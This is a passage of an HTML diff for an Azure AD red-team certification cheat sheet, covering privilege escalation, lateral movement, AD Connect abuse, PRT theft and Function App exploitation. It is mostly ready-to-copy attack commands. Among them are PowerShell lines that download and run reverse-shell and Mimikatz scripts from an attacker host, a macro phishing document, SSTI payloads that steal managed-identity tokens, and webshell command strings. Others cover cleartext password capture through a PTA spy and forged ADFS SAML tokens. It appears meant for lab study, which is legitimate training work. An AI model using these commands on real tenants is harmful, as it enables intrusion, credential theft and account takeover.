+lures get-url 0</pre></div>
+    </div>
+
+    <h3>Macro RCE via Phishing</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Create malicious Word document</span>
+iex (New-Object Net.Webclient).downloadstring("http://&lt;ATTACKER_IP&gt;:82/Out-Word.ps1")
+Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('http://&lt;ATTACKER_IP&gt;:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress &lt;ATTACKER_IP&gt; -Port 4444" -OutputFile &lt;OUTPUT&gt;.doc
+
+<span class="comment"># Upload via 365-Stealer</span>
+python 365-Stealer.py --refresh-user &lt;TARGET_USER&gt;@&lt;DOMAIN&gt; --upload C:\AzAD\Tools\&lt;FILE&gt;.doc
+
+<span class="comment"># Catch reverse shell</span>
+C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444</pre></div>
+    </div>
+</div>
+
+<!-- 10 PRIVILEGE ESCALATION -->
+<div class="section-block reveal" id="privesc">
+    <div class="section-number">// 10</div>
+    <h2>Privilege <span class="accent">Escalation</span></h2>
+
+    <h3>Dynamic Group Abuse</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Check for Dynamic Membership groups</span>
+Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}
+
+<span class="comment"># Abuse: change user email to match dynamic rule</span>
+<span class="comment"># Example: if rule matches "*vendor*" in OtherMails</span>
+Connect-AzureAD -Credential $creds -TenantId &lt;TENANT_ID&gt;
+Set-AzureADUser -ObjectId &lt;USER_OBJECT_ID&gt; -OtherMails &lt;MATCHING_EMAIL&gt; -Verbose</pre></div>
+    </div>
+
+    <h3>Service Principal Secret Addition</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Add secret to Enterprise Apps we can abuse</span>
+. C:\AzAD\Tools\Add-AzADAppSecret.ps1
+Add-AzADAppSecret -GraphToken $graphtoken -Verbose
+
+<span class="comment"># If we are owner of an app, add password credential</span>
+Get-AzureADApplicationOwner -ObjectId &lt;APP_OBJECT_ID&gt;
+New-AzureADApplicationPasswordCredential -ObjectId &lt;APP_OBJECT_ID&gt;
+
+<span class="comment"># Login as service principal with new secret</span>
+az login --service-principal -u &lt;APP_ID&gt; -p &lt;APP_SECRET&gt; -t &lt;TENANT_ID&gt;
+
+<span class="comment"># Check API permissions of the app</span>
+$app = Get-AzureADApplication -ObjectId &lt;APP_OBJECT_ID&gt;
+$app.RequiredResourceAccess | ConvertTo-Json -Depth 3</pre></div>
+    </div>
+
+    <h3>User Data Extraction from VM</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Extract user data from VM metadata endpoint</span>
+$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&amp;format=text"
+[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))</pre></div>
+    </div>
+</div>
+
+<!-- 11 LATERAL MOVEMENT -->
+<div class="section-block reveal" id="lateral">
+    <div class="section-number">// 11</div>
+    <h2>Lateral <span class="accent">Movement</span></h2>
+
+    <h3>VM Command Execution</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Execute command on Azure VM (Az PowerShell)</span>
+Invoke-AzVMRunCommand -VMName &lt;VM_NAME&gt; -ResourceGroupName &lt;RG_NAME&gt; -CommandId 'RunPowerShellScript' -ScriptPath '&lt;SCRIPT_PATH&gt;' -Verbose
+
+<span class="comment"># Execute command on Azure VM (Az CLI)</span>
+az vm run-command invoke --resource-group &lt;RG_NAME&gt; -n &lt;VM_NAME&gt; --command-id RunPowerShellScript --scripts "&lt;COMMAND&gt;"
+
+<span class="comment"># Get VM public IP</span>
+Get-AzVM -Name &lt;VM_NAME&gt; -ResourceGroupName &lt;RG_NAME&gt; | select -ExpandProperty NetworkProfile
+Get-AzNetworkInterface -Name &lt;NIC_NAME&gt;
+Get-AzPublicIpAddress -Name &lt;IP_NAME&gt;</pre></div>
+    </div>
+
+    <h3>Add Local Admin via VM Extension</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Check existing VM extensions</span>
+Get-AzVMExtension -ResourceGroupName "&lt;RG_NAME&gt;" -VMName "&lt;VM_NAME&gt;"
+
+<span class="comment"># Modify extension to add local admin</span>
+Set-AzVMExtension -ResourceGroupName "&lt;RG_NAME&gt;" -ExtensionName "ExecCmd" -VMName "&lt;VM_NAME&gt;" -Location "&lt;LOCATION&gt;" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users &lt;USERNAME&gt; &lt;PASSWORD&gt; /add /Y; net localgroup administrators &lt;USERNAME&gt; /add"}'
+
+<span class="comment"># Connect via PSRemoting</span>
+$password = ConvertTo-SecureString '&lt;PASSWORD&gt;' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('&lt;USERNAME&gt;', $password)
+$sess = New-PSSession -ComputerName &lt;VM_IP&gt; -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
+Enter-PSSession $sess</pre></div>
+    </div>
+
+    <h3>Check Azure AD Join Status</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Check if machine is Azure AD joined</span>
+dsregcmd /status
+<span class="comment"># Look for AzureAdJoined: YES</span></pre></div>
+    </div>
+</div>
+
+<!-- 12 AZURE AD CONNECT ABUSE -->
+<div class="section-block reveal" id="adconnect">
+    <div class="section-number">// 12</div>
+    <h2>Azure AD Connect <span class="accent">Abuse</span></h2>
+
+    <h3>PHS (Password Hash Sync) Abuse</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># On the AD Connect server, extract sync credentials</span>
+Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1
+Get-AADIntSyncCredentials
+<span class="comment"># Extracts MSOL_* and Sync_* account credentials</span>
+
+<span class="comment"># Use Sync account to get AADGraph access token</span>
+$passwd = ConvertTo-SecureString '&lt;SYNC_PASSWORD&gt;' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("&lt;SYNC_ACCOUNT&gt;@&lt;DOMAIN&gt;", $passwd)
+Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
+
+<span class="comment"># Get ImmutableId of target user</span>
+Get-AADIntUser -UserPrincipalName &lt;TARGET_USER&gt;@&lt;DOMAIN&gt; | select ImmutableId
+
+<span class="comment"># Reset user password using Sync account</span>
+Set-AADIntUserPassword -SourceAnchor "&lt;IMMUTABLE_ID&gt;" -Password "&lt;NEW_PASSWORD&gt;" -Verbose</pre></div>
+    </div>
+
+    <h3>PTA (Pass-Through Auth) Spy</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># On the PTA server, install PTA spy</span>
+Import-Module C:\Users\&lt;ADMIN&gt;\Documents\AADInternals\AADInternals.psd1
+Install-AADIntPTASpy
+
+<span class="comment"># Capture passwords in cleartext</span>
+Get-AADIntPTASpyLog -DecodePasswords</pre></div>
+    </div>
+
+    <h3>ADFS Token Forging</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># On the ADFS server, export signing certificate</span>
+Export-AADIntADFSSigningCertificate
+
+<span class="comment"># Get ImmutableID of target on-prem user</span>
+Import-Module C:\AzAD\Tools\ADModule\Microsoft.ActiveDirectory.Management.dll
+[System.Convert]::ToBase64String((Get-ADUser -Identity &lt;ON_PREM_USER&gt; -Server &lt;DC_IP&gt; -Credential $creds | select -ExpandProperty ObjectGUID).tobytearray())
+
+<span class="comment"># Forge SAML token and open portal</span>
+Open-AADIntOffice365Portal -ImmutableID &lt;IMMUTABLE_ID&gt; -Issuer http://&lt;ADFS_DOMAIN&gt;/adfs/services/trust -PfxFileName C:\users\&lt;ADMIN&gt;\Documents\ADFSSigningCertificate.pfx -Verbose
+
+<span class="comment"># Copy generated HTML to student VM and open in browser</span>
+Copy-Item -FromSession $adfs -Path C:\Users\&lt;ADMIN&gt;\AppData\Local\Temp\*.tmp.html -Destination C:\AzAD\Tools\</pre></div>
+    </div>
+</div>
+
+<!-- 13 AZURE RESOURCES ABUSE -->
+<div class="section-block reveal" id="resources">
+    <div class="section-number">// 13</div>
+    <h2>Azure Resources <span class="accent">Abuse</span></h2>
+
+    <h3>Storage Account &amp; Blob Abuse</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Enumerate storage accounts</span>
+Get-AzStorageAccount | fl
+
+<span class="comment"># Enumerate blobs</span>
+. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureBlobs.ps1
+Invoke-EnumerateAzureBlobs -Base &lt;TARGET_BASE&gt;
+
+<span class="comment"># List containers in storage account</span>
+Get-AzStorageContainer -Context (Get-AzStorageAccount -Name &lt;STORAGE_NAME&gt; -ResourceGroupName &lt;RG_NAME&gt;).Context
+
+<span class="comment"># If SAS URL is available, use Azure Storage Explorer to download</span></pre></div>
+    </div>
+
+    <h3>Key Vault Access</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Connect with KeyVault token</span>
+Connect-AzAccount -AccessToken &lt;ARM_TOKEN&gt; -AccountId &lt;ACCOUNT_ID&gt; -KeyVaultAccessToken &lt;VAULT_TOKEN&gt;
+
+<span class="comment"># Enumerate Key Vaults</span>
+Get-AzKeyVault
+
+<span class="comment"># List secrets</span>
+Get-AzKeyVaultSecret -VaultName &lt;VAULT_NAME&gt;
+
+<span class="comment"># Read secret value in plaintext</span>
+Get-AzKeyVaultSecret -VaultName &lt;VAULT_NAME&gt; -Name &lt;SECRET_NAME&gt; -AsPlainText</pre></div>
+    </div>
+
+    <h3>App Service SSTI (Server-Side Template Injection)</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Jinja2 / Python</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Enumerate config variables</span>
+{{config.items()}}
+
+<span class="comment"># Execute OS commands</span>
+{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
+
+<span class="comment"># Read environment variables (look for IDENTITY_ENDPOINT, IDENTITY_HEADER)</span>
+{{config.__class__.__init__.__globals__['os'].popen('env').read()}}
+
+<span class="comment"># Request ARM token via Managed Identity</span>
+{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&amp;api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
+
+<span class="comment"># Request KeyVault token via Managed Identity</span>
+{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&amp;api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}</pre></div>
+    </div>
+
+    <h3>App Service - File Upload Shell</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Upload webshell (.phtml) to app service</span>
+<span class="comment"># Access: https://&lt;APP_NAME&gt;.azurewebsites.net/uploads/&lt;SHELL&gt;.phtml?cmd=env</span>
+<span class="comment"># Look for IDENTITY_ENDPOINT, IDENTITY_HEADER and client_id</span>
+
+<span class="comment"># Connect with extracted token</span>
+Connect-AzAccount -AccessToken &lt;TOKEN&gt; -AccountId &lt;CLIENT_ID&gt;</pre></div>
+    </div>
+</div>
+
+<!-- 14 AUTOMATION ACCOUNT ABUSE -->
+<div class="section-block reveal" id="automation">
+    <div class="section-number">// 14</div>
+    <h2>Automation Account <span class="accent">Abuse</span></h2>
+
+    <h3>Enumerate Automation Accounts</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell / CLI</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># List Automation Accounts</span>
+az automation account list
+
+<span class="comment"># Check objects owned by current user</span>
+az ad signed-in-user list-owned-objects
+
+<span class="comment"># If user can be added to Automation Admins group</span>
+Add-AzureADGroupMember -ObjectId &lt;GROUP_ID&gt; -RefObjectId &lt;USER_OBJECT_ID&gt; -Verbose
+
+<span class="comment"># Check role on Automation Account (look for Contributor)</span>
+Get-AzRoleAssignment -Scope &lt;AUTOMATION_ACCOUNT_RESOURCE_ID&gt;
+
+<span class="comment"># Check Hybrid Worker Groups</span>
+Get-AzAutomationHybridWorkerGroup -AutomationAccountName &lt;AA_NAME&gt; -ResourceGroupName &lt;RG_NAME&gt;</pre></div>
+    </div>
+
+    <h3>Runbook Import, Publish &amp; Execute</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Import runbook</span>
+Import-AzAutomationRunbook -Name &lt;RUNBOOK_NAME&gt; -Path &lt;PS1_PATH&gt; -AutomationAccountName &lt;AA_NAME&gt; -ResourceGroupName &lt;RG_NAME&gt; -Type PowerShell -Force -Verbose
+
+<span class="comment"># Publish runbook</span>
+Publish-AzAutomationRunbook -RunbookName &lt;RUNBOOK_NAME&gt; -AutomationAccountName &lt;AA_NAME&gt; -ResourceGroupName &lt;RG_NAME&gt; -Verbose
+
+<span class="comment"># Start runbook on Hybrid Worker</span>
+Start-AzAutomationRunbook -RunbookName &lt;RUNBOOK_NAME&gt; -RunOn &lt;WORKER_GROUP&gt; -AutomationAccountName &lt;AA_NAME&gt; -ResourceGroupName &lt;RG_NAME&gt; -Verbose
+
+<span class="comment"># Catch reverse shell</span>
+C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444</pre></div>
+    </div>
+
+    <h3>Az CLI - Runbook Privilege Escalation</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash / CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Create runbook via CLI</span>
+az automation runbook create --automation-account-name "&lt;AA_NAME&gt;" --resource-group "&lt;RG_NAME&gt;" --name "&lt;RUNBOOK_NAME&gt;" --type "PowerShell" --location "&lt;LOCATION&gt;"
+
+<span class="comment"># Replace runbook content with privesc script</span>
+az automation runbook replace-content --automation-account-name "&lt;AA_NAME&gt;" --resource-group "&lt;RG_NAME&gt;" --name "&lt;RUNBOOK_NAME&gt;" --content privesc.ps1
+
+<span class="comment"># Publish and start</span>
+az automation runbook publish --automation-account-name "&lt;AA_NAME&gt;" --resource-group "&lt;RG_NAME&gt;" --name "&lt;RUNBOOK_NAME&gt;"
+az automation runbook start --automation-account-name "&lt;AA_NAME&gt;" --resource-group "&lt;RG_NAME&gt;" --name "&lt;RUNBOOK_NAME&gt;"</pre></div>
+    </div>
+
+    <div class="note">Privesc script example: Use Connect-AzAccount -Identity then New-AzRoleAssignment to grant Owner role to your user ObjectId on the subscription scope.</div>
+</div>
+
+<!-- 15 ADVANCED ENUMERATION TOOLS -->
+<div class="section-block reveal" id="enumtools">
+    <div class="section-number">// 15</div>
+    <h2>Advanced <span class="accent">Enumeration Tools</span></h2>
+
+    <h3>ROADTools</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD / Python</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># ROADRecon - Azure AD enumeration</span>
+cd C:\AzAD\Tools\ROADTools
+pipenv shell
+
+<span class="comment"># Authenticate</span>
+roadrecon auth -u &lt;USER&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt;
+
+<span class="comment"># Gather data and launch GUI</span>
+roadrecon gather
+roadrecon gui</pre></div>
+    </div>
+
+    <h3>Stormspotter</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD / Python</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Start backend</span>
+cd C:\AzAD\Tools\stormspotter\backend
+pipenv shell
+python ssbackend.pyz
+
+<span class="comment"># Start frontend (new terminal)</span>
+cd C:\AzAD\Tools\stormspotter\frontend\dist\spa
+quasar.cmd serve -p 9091 --history
+
+<span class="comment"># Collect data (new terminal)</span>
+cd C:\AzAD\Tools\stormspotter\stormcollector
+pipenv shell
+az login -u &lt;USER&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt;
+python C:\AzAD\Tools\stormspotter\stormcollector\sscollector.pyz</pre></div>
+    </div>
+
+    <h3>AzureHound &amp; BloodHound Neo4j Queries</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell / Cypher</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Run AzureHound</span>
+Connect-AzAccount -Credential $creds
+Connect-AzureAD -Credential $creds
+. C:\AzAD\Tools\AzureHound\AzureHound.ps1
+Invoke-AzureHound -Verbose
+
+<span class="comment"># Neo4j Cypher Queries:</span>
+
+<span class="comment"># Find all Global Administrators</span>
+MATCH p =(n)-[r:AZGlobalAdmin*1..]->(m) RETURN p
+
+<span class="comment"># Find all paths to an Azure VM</span>
+MATCH p = (n)-[r]->(g:AZVM) RETURN p
+
+<span class="comment"># Find all paths to an Azure KeyVault</span>
+MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p
+
+<span class="comment"># Find all paths to an Azure Resource Group</span>
+MATCH p = (n)-[r]->(g:AZResourceGroup) RETURN p
+
+<span class="comment"># Find Owners of Azure Groups</span>
+MATCH p = (n)-[r:AZOwns]->(g:AZGroup) RETURN p</pre></div>
+    </div>
+</div>
+
+<!-- 16 PRT (PRIMARY REFRESH TOKEN) ATTACKS -->
+<div class="section-block reveal" id="prt">
+    <div class="section-number">// 16</div>
+    <h2>PRT <span class="accent">Attacks</span></h2>
+
+    <h3>Request Nonce</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Request a nonce for PRT</span>
+$TenantId = "&lt;TENANT_ID&gt;"
+$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"
+$Params = @{
+    "URI"    = $URL
+    "Method" = "POST"
+}
+$Body = @{
+    "grant_type" = "srv_challenge"
+}
+$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
+$Result.Nonce</pre></div>
+    </div>
+
+    <h3>Extract PRT with ROADToken</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Send tools to target</span>
+Copy-Item -ToSession $sess -Path C:\AzAD\Tools\ROADToken.exe -Destination C:\Users\Public\ -Verbose
+Copy-Item -ToSession $sess -Path C:\AzAD\Tools\PsExec64.exe -Destination C:\Users\Public\ -Verbose
+Copy-Item -ToSession $sess -Path C:\AzAD\Tools\SessionExecCommand.exe -Destination C:\Users\Public\ -Verbose
+
+<span class="comment"># Extract PRT using target user's session (run as SYSTEM)</span>
+Invoke-Command -Session $sess -ScriptBlock{C:\Users\Public\PsExec64.exe -accepteula -s "cmd.exe" "/c C:\Users\Public\SessionExecCommand.exe &lt;TARGET_USER&gt; C:\Users\Public\ROADToken.exe &lt;NONCE&gt; > C:\Users\Public\PRT.txt"}</pre></div>
+    </div>
+
+    <h3>Use PRT as Cookie</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Browser</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># 1. Navigate to https://login.microsoftonline.com/login.srf</span>
+<span class="comment"># 2. Clear ALL cookies in browser</span>
+<span class="comment"># 3. Add cookie: x-ms-RefreshTokenCredential = &lt;PRT_TOKEN&gt;</span>
+<span class="comment"># 4. Set cookie flags: HTTPOnly = true, Secure = true</span>
+<span class="comment"># 5. Visit https://login.microsoftonline.com/login.srf again</span>
+<span class="comment"># 6. You are now logged in as the target user</span></pre></div>
+    </div>
+</div>
+
+<!-- 17 APPLICATION PROXY & INTUNE ABUSE -->
+<div class="section-block reveal" id="proxy">
+    <div class="section-number">// 17</div>
+    <h2>App Proxy &amp; <span class="accent">Intune Abuse</span></h2>
+
+    <h3>Application Proxy Enumeration</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Enumerate Application Proxy apps</span>
+Get-AzureADApplication | %{try{Get-AzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}
+
+<span class="comment"># Get service principal for the app</span>
+Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "&lt;APP_NAME&gt;"}
+
+<span class="comment"># Get assigned users and groups</span>
+. C:\AzAD\Tools\Get-ApplicationProxyAssignedUsersAndGroups.ps1
+Get-ApplicationProxyAssignedUsersAndGroups -ObjectId &lt;SP_OBJECT_ID&gt;</pre></div>
+    </div>
+
+    <h3>Shell Upload via App Proxy</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># If app has file upload, upload webshell</span>
+<span class="comment"># Access via proxy URL:</span>
+https://&lt;APP_PROXY_URL&gt;/dist/uploads/&lt;SHELL&gt;.phtml?cmd=powershell iex (New-Object Net.Webclient).downloadstring('http://&lt;ATTACKER_IP&gt;:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress &lt;ATTACKER_IP&gt; -Port 4444
+
+<span class="comment"># Extract secrets from compromised machine</span>
+iex (New-Object Net.Webclient).DownloadString("http://&lt;ATTACKER_IP&gt;:82/Invoke-Mimikatz.ps1")
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'</pre></div>
+    </div>
+
+    <h3>Intune Script Deployment</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Portal</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># As Intune Administrator:</span>
+<span class="comment"># 1. Go to https://endpoint.microsoft.com/#home</span>
+<span class="comment"># 2. Navigate to Devices -&gt; All Devices (check enrolled devices)</span>
+<span class="comment"># 3. Go to Scripts and click Add for Windows 10</span>
+<span class="comment"># 4. Upload PowerShell script (e.g., add_user.ps1)</span>
+<span class="comment"># 5. In Assignments select Add All Users -&gt; Add All Devices</span>
+<span class="comment"># Script executes as SYSTEM on enrolled devices</span></pre></div>
+    </div>
+</div>
+
+<!-- 18 GITHUB & FUNCTION APP EXPLOITATION -->
+<div class="section-block reveal" id="github">
+    <div class="section-number">// 18</div>
+    <h2>GitHub &amp; <span class="accent">Function App Exploitation</span></h2>
+
+    <h3>Function App Token Extraction</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Python / PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Modify function code to extract Managed Identity token</span>
+import logging, os
+import azure.functions as func
+
+def main(req: func.HttpRequest) -> func.HttpResponse:
+    logging.info('Python HTTP trigger function processed a request.')
+    IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
+    IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
+    cmd = 'curl "%s?resource=https://management.azure.com&amp;api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
+    val = os.popen(cmd).read()
+    return func.HttpResponse(val, status_code=200)
+
+<span class="comment"># Use extracted token (get client_id as AccountId)</span>
+Connect-AzAccount -AccessToken &lt;FUNCTION_TOKEN&gt; -AccountId &lt;CLIENT_ID&gt;</pre></div>
+    </div>
+
+    <h3>CI/CD Abuse via GitHub</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash / Git</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># If we have SSH keys for a GitHub account</span>
+mkdir C:\Users\&lt;USER&gt;\.ssh
+copy C:\AzAD\Tools\id_rsa C:\Users\&lt;USER&gt;\.ssh\id_rsa
+ssh -T git@github.com
+
+<span class="comment"># Clone repository linked to Function App</span>
+git clone git@github.com:&lt;ORG&gt;/&lt;REPO&gt;.git
+
+<span class="comment"># Modify function code or add malicious user JSON</span>
+<span class="comment"># Example: create user via Function App trigger</span>
+git add .
+git config --global user.email "&lt;COMPROMISED_EMAIL&gt;"
+git config --global user.name "&lt;COMPROMISED_USER&gt;"
+git commit -m "Update"
+git push
+
+<span class="comment"># Trigger the Function App</span>
+<span class="comment"># https://&lt;FUNCTION_APP&gt;.azurewebsites.net/api/&lt;FUNCTION_NAME&gt;?id=</span></pre></div>
+    </div>
+
+    <h3>Resource Group Deployment Secrets</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># List resource groups</span>
+Get-AzResourceGroup
+
+<span class="comment"># List deployments (may contain credentials)</span>
+Get-AzResourceGroupDeployment -ResourceGroupName &lt;RG_NAME&gt;
+
+<span class="comment"># Download deployment template (search for hardcoded creds)</span>
+Save-AzResourceGroupDeploymentTemplate -ResourceGroupName &lt;RG_NAME&gt; -DeploymentName &lt;DEPLOYMENT_NAME&gt;</pre></div>
+    </div>
+</div>
+
+</main>
+</div>
+
+<!-- Back to top -->
+<a href="#" class="back-top" id="backTop">&uarr;</a>
+
+<!-- Footer -->
+<footer class="footer">
+    <div class="footer-inner">
+        <a href="/" class="footer-brand">GUARINA0x0</a>
+        <span class="footer-sep">&bull;</span>
+        <span>CARTP Cheatsheet</span>
+        <span class="footer-sep">&bull;</span>
+        <span>&copy; 2026</span>
+        <span class="footer-sep">&bull;</span>
+        <div class="footer-social">
+            <a href="https://github.com/Guarina0x0" target="_blank" rel="noopener noreferrer" aria-label="GitHub">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
+            </a>
+            <a href="https://www.linkedin.com/in/antonio-gallego-l%C3%B3pez-14047b1bb/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+            </a>
+            <a href="https://x.com/Guarina0x0" target="_blank" rel="noopener noreferrer" aria-label="X (Twitter)">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+            </a>
+        </div>
+    </div>
+    <p class="footer-dimension">Transmitiendo desde la Dimensi&oacute;n C-137</p>
+</footer>
+
